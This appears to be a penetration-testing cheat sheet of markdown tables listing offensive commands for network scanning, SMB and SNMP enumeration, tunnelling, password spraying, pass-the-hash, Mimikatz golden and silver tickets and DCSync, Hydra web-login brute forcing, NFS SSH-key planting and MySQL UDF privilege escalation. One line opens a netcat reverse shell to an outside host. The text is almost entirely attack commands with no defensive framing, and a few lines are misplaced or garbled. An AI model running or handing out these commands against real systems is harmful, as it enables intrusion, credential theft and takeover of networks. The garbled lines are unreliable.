
### Service Enumeration To Identify how Many TCP and UDP Port is being Opened

| for Example  |
| ------------- |
|nmap -Pn -n --open -p500  192.168.0.0/24 |
|nmap -Pn -n --open -p161  192.168.0.0/24 |
|nmap -p445 --script smb-vuln-ms17-010 x.x.x.0/24|
|nmap -sV --script=realvnc-auth-bypass x.x.x.0/24|
|nmap --script http-webdav-scan -p80,8080 x.x.x.0/24|
|nmap -p80 --script http-default-account x.x.x.0/24|
|nmap -Pn -n --open -p6000-6005 --script=x11-access 172.31.6.0/24  |
|nmap -Pn -n --open -p3389 --script=rdp-vuln-ms12-020,rdp-enum-encryption 172.31.6.0/24 |
|nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,445,1433,1521,3306,3389,8080,10000 192.168.2.9/24 |
|nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,445,1433,1521,3306,3389,8080,10000 192.168.2.9/24 | awk '/22\/open/ {print $2}' |


### Linux and Microsoft RPC service Enumeration

| for Example |
| ------------- |
|smbmap -H 10.10.10.103 # N No password |
|smbclient -N -L \\\\192.168.1.1|
|smbclient -N //192.168.1.1/SYSVOL|
|smbmap -H 10.10.10.103 -u MeMe -p 123456aQ |
|smbclient \\\\10.10.10.100\\NETLOGON|
|smbclient \\\\10.10.10.100\\Replication|
|smbmap -u MeMe -r BatShare -H 10.10.10.130|
| smbmap -u MeME--download Secret\\Password.zip -H 192.168.1.1|
|smbmap.py -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18|
| smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
|smbclient \\\\10.10.10.103\\C$  -U "Administrator" --pw-nt-hash f6b7160bfc91823792e0ac3a162c9267|
| mount -t cifs //10.10.10.134/Backups /mnt/smb #Mount|

### Commonly Users and Service Enumeration Through Running RPC and SNMP Services

|for Example  |
| ------------- |
|rpcclient –U “” [target IP address] |
| > querydominfo |
| >enumdomusers|
| >queryuser msfadmin| 
| >queryuser msfadmin|
|snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25 #User|
|snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2 # Running Service|
| snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5 #Hostname |
|snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1 #Share Information|
|snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3 #Openning Port|



### Advanced SSH and Window PortProxy Tunneling and Port Forwarding

| for Example |
| ------------- |
|ssh -L 127.0.0.1:8080:127.0.0.1:80 remotehost |
|ssh -nNT -L 8000:localhost:3306 user@pivoting host #Local Port Forwarding |
|ssh -nNT -R 0.0.0.0:4000:192.168.1.101:631 user@pivot host |
|ssh -D 5000 -nNT user@pivoting host #SOCKS Proxy|
|ssh -p 13339 -f -N j0hn@10.11.1.252  |
|ssh -N -f -D 8888 -p 22000 j0hn@192.168.13.252 |
|plink.exe -l root -pw  -R 445:127.0.0.1:445 10.10.14.8 #winexe -U Administrator //127.0.0.1 "cmd.exe|
|plink.exe -l root -pw  -R 3389:127.0.0.1:3389 10.10.14.8 #rdesktop -U Administrator 127.0.0.1 |
|ssh -nNT -R 3389:localhost:3389 user@pivot host #Remote Port Forward |
|netsh interface portproxy add v4tov4 listenport=1111 Compromise Box=x.x.x.1 connectport=1111 connectaddress=Attacker|
|netsh interface portproxy add v4tov4 listenport=1111 listenaddress=x.x.x.1 connectport=1111 connectaddress=x.x.x.10 |
|netsh interface portproxy add v4tov4 listenport=9001 listenaddress=x.x.x.1 connectport=9001 connectaddress=x.x.x.100 |




|  Password Spraying Attack |
| ------------- |
| crackmapexec smb 192.168.1.1  -d ninja.corp -u MeME -P /usr/share/wordlists/rockyou.txt|
| smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
| crackmapexec smb 192.168.1.1 -u MeMe -H NTHASH |
|crackmapexec smb 192.168.1.1 -u '' -p '' #NULL Sessions|
|spray.sh -smb 192.168.1.1 users.txt /usr/share/wordlists/rockyou.txt  1 35 ninja.corp|
|spray.sh -owa 192.168.1.1 users.txt  /usr/share/wordlists/rockyou.txt   1 35 Request.body #OWA|
|spray.sh -ciso 192.168.1.1 usernames.txt /usr/share/wordlists/rockyou.txt 1 35 #CISCO Web VPN|
|./atomizer.py owa contoso.com 'Fall2018' emails.txt|


### Active Directory Enumeration 

|Active Directory Enumeration | for Example |
| ------------- | ------------- |
| [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | current domain info|
| ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() | domain trusts|
| [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest() | current forest info|
| Get-NetDomain | gets the name of the current user's domain|
| Get-NetForest | gets the forest associated with the current user's domain|
| Get-NetForestDomain | gets all domains for the current forest|
| Get-NetDomainController | gets the domain controllers for the current computer's domain|
| Get-NetComputer | gets a list of all current servers in the domain|
| Get-NetDomainTrust  | gets all trusts for the current user's domain|
| Get-NetForestTrust |  gets all trusts for the forest associated with the current user's domain|
| Find-LocalAdminAccess | finds machines on the domain that the current user has local admin access to|
| Get-ExploitableSystem |  finds systems likely vulnerable to common exploits|
| Get-ObjectAcl | returns the ACLs associated with a specific active directory object|
| Get-DomainSID | return the SID for the specified domain|
| Get-NetFileServer | get a list of file servers used by current domain users|


### Commands Execute Remotely using Both Plaintext and NTLM


| for Example |
| ------------- |
| PsExec64.exe \\192.168.1.104 -u administrator -p forever cmd |
| psexec \\192.168.122.66 -u Administrator -p 123456Ww ipconfig|
| psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t ipconfig |
| PsExec64.exe \\ninja.corp cmd |
| psexec.py Resilient-Ninja:123456@192.168.200.1 ipconfig |
| wmiexec.py Resilient-Ninja:123456@192.168.200.1 ipconfig |
|pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 cmd.exe|
| pth-wmic -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 "select Name from Win32_UserAccount"|
| pth-wims -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 "cmd.exe /c   whoami > c:\temp\result.txt" |
| pth-smbclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //x.x.x.10/c$ |
| pth-rpcclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //x.x.x.10 |
|crackmapexec 192.168.1.1 -u Administrator -p '1234567qA' -x whoami|

| PowerShell Remoting |
| ------------- |
|$Username = 'ninja.corp\MeMe' #powershell variable |
|$Password = '123456789aA'|
|$pass= ConvertTo-SecureString -AsPlainText $Password -Force #powershell variable |
|$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass #powershell variable |
|Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {hostname}|
|Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {cmd.exe /c nc.exe -v 192.168.1.100 7777 -e cmd.exe}|



### Mimikatz Guide

| Pass-the-Hash  |
| ------------- |
|Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:ninja.corp  /target:ninja.corp /ntlm:a87f3a337d73085c45f9416be5787d86 /ptt "'|

|Silver Tickets  |
| ------------- |
|kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /target:fs01 /rc4:47b1d9d581f29b3b43845692bd4a0322 /service:cifs /ptt|

|Golden Tickets |
| ------------- |
|Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:ninja.corp /sid: S-1-5-21-3107064655-183826745-1492997513 /krbtgt:a89f4db26e65cdf4bb6cb6c1a1990eec /ptt" '|
|Invoke-Mimikatz -Command '"kerberos::golden /user:evil /domain:ninja.corp /sid: S-1-5-21-3107064655-183826745-1492997513 /krbtgt:a89f4db26e65cdf4bb6cb6c1a1990eec /ptt" '|
|Invoke-Mimikatz -Command '"kerberos::golden /user:MeMe /domain:ninja.corp /sid: S-1-5-21-3107064655-183826745-1492997513 /krbtgt:a89f4db26e65cdf4bb6cb6c1a1990eec /ptt" '|

|DCSync |
| ------------- |
|lsadump::dcsync /domain:pentestlab.local /all /csv|
|Invoke-Mimikatz -Command '"lsadump::dcsync /domain:insomnia.ninja.corp /all /csv"'|
|Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'|
|Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'|


### Avance Cracking Web Forms with Hydra

| For example  |
| ------------- |
|hydra -l admin -P /usr/share/wordlists/rockyou.txt  -f -V -s 80 192.168.1.2 http-get /wp-admin/|
|hydra -l root -P /usr/share/wordlists/rockyou.txt  -f -V -s 7001 178.72.90.181 http-post-form "/cgi-bin/luci:username=^USER^&password=^PASS^:Invalid username"|
|hydra 192.168.100.155 -V -l admin -P passwordlist http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=rjevaetqb3dqbj1ph3nmjchel2; security=low"|
|hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list "/endpoit/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s PORT -P /usr/share/wordlists/list|
|hydra -l IRISnoir -P /usr/share/wordlists/rockyou.txt -e nsr -v -V http-post-form://testasp.vulnweb.com/"Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout"|



| Linxu and Microsoft RPC Enumeration  |
| ------------- |
| smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
| smbclient -N -L \\\\10.10.10.103 |



### Insecure NFS Share Vulnerabilities

| for Example |
| ------------- |
| showmount -e 192.168.100.25 #Check if any share is available |
| mount -t nfs 192.168.100.25:/home /tmp/NFS |
| mount -t nfs 192.168.1.112:/ /mnt -o nolock |
| mkdir -p /root/.ssh # We May Upload SSH Key to NFS |
| ssh-keygen -t rsa -b 4096 |
| cp /root/.ssh/hacker_rsa.pub /mnt/root/.ssh/ |
| cat authorized_keys |
| cat id_rsa.pub >> authorized_keys |
|ssh -i /root/.ssh/hacker_rsa root@192.168.1.112|



### X 11  Common Vulnerability

| for Example  |
| ------------- |
| use auxiliary/scanner/x11/open_x11 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@|
| nmap -p 6000 --script=x11-access 192.168.2.26,75 |
| create table npn(line blob); |
| xdpyinfo -display 192.168.2.75:0 | head -n 5 |
| xspy -display 192.168.1.23:0 -delay 100 |



### MySQL Privilge Escalation Through UDF

| for Example|
| ------------- |
|gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc|
| use mysql; |
|create table npn(line blob); |
| insert into npn values(load_file('/tmp/raptor_udf2.so')); |
|select * from npn into dumpfile '/usr/lib/raptor_udf2.so';|
| create function do_system returns integer soname 'raptor_udf2.so'; |
| select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell'); |
